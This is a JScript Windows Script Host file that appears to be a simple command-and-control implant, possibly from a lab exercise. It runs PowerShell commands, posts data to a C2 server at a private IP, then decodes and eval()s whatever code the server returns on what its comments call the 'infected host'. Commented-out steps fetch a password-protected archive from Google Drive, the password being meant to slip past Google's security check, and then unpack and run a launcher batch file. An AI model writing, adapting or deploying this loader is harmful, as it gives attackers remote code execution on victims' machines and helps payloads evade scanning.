
// run cmd using Powershell and return result of command
function runCMD(cmd) {
    try {
        var wsh = new ActiveXObject("WScript.Shell");
        var exec = wsh.Exec('powershell.exe /c "' + cmd + '"');
        var output = exec.StdOut.ReadAll();
        return output;
    } catch (error) {}
    
    return false;
}

// execute file using Powershell
function executeFile(file) {
    try {
        var wsh = new ActiveXObject("WScript.Shell");
        var exec = wsh.Exec('powershell.exe /c "' + file + '"');
        var output = exec.StdOut.ReadAll();
        return true;
    } catch (error) {}
    
    return false;
}

// send parameters to server using HTTP Post and return response from server
function request(params) {    
    var xmlHttp;
    var attempts = 1;
    var timeout = 3*1000;
    var fileUrl = 'http://192.168.203.137/c2/c2.php'
    
    for (var i = 0; i < attempts; i ++) {
        try {
            xmlHttp = new ActiveXObject("MSXML2.XMLHTTP");
            xmlHttp.open("POST", fileUrl, false);
            xmlHttp.setRequestHeader('AUTH255', 'login');
            xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            //WScript.Echo('a=' + params + '&t=' + encodeBase64(+(new Date())));
            xmlHttp.send('a=' + params + '&t=' + encodeBase64(+(new Date())));
            if (xmlHttp.status == 200) {
                return xmlHttp.responseText;
            } else {}
            //WScript.Sleep(timeout);
        } catch (error) {}
    }
    
    return false;
}

// base64 encoding
function encodeBase64(data) {
    try {
        return runCMD("[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('" + data + "'))");
    } catch (error) {}
    return false;
}

// base64 decoding
function decodeBase64(data) {
    try {
        return runCMD("[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + data + "'))");
    } catch (error) {}
    return false;
}

// return file content
function readFile(file) {
    try {
        return runCMD('cat ' + file);
    } catch (error) {}
    return false;
}

// download file from drive using Powershell
function downloadFileFromDrive(url, file_name) {
    var file_id = url.split('/')[5];
    var download_url = 'https://drive.google.com/uc?export=download&id=' + file_id;
    try {
        runCMD("wget '" + download_url + "' -OutFile " + file_name);
        return true;
    } catch (error) {}
    return false;
}

// Note: Powershell Expand-Archive can't decompress zip with password -> need password to bypass google security check
//       I open Powershell in admin mode, and I install 7zip module manually. cmd is `Install-Module -Name 7Zip4Powershell`
//       I use 7zip module to decompress file with password
function decompress(file, password) {
    try {
        runCMD("Expand-7Zip " + file + " -TargetPath . -Password '" + password + "'");
        return true;
    } catch (error) {}
    return false;
}

function main() {
    // Note: download file from drive and decompress it
    // downloadFileFromDrive('https://drive.google.com/file/d/1MnjOdoi4_1FBGO08T2Kf3M4DBitGewxm/view?usp=sharing', 'launcher.zip');
    // decomddpress('launcher.zip', '/?????');
    // executeFile('.\\launcher.bat');
    
    // Note: read file and send it to attacker server using HTTP POST
    //       server response a function and execute it in infected host
    var timeout = 3*1000;
    var params = 'initial';
    while (true) {
        var response_data = request(encodeBase64(params));
        
        if (response_data !== false && response_data != '0' && response_data != '') {
            var content = decodeBase64(response_data);
            
            //WScript.Echo(content);
            eval(content);
            if (typeof example == 'function') {
                example();
            }
        }
        WScript.Sleep(1);
        break;
    }
    
}

main();
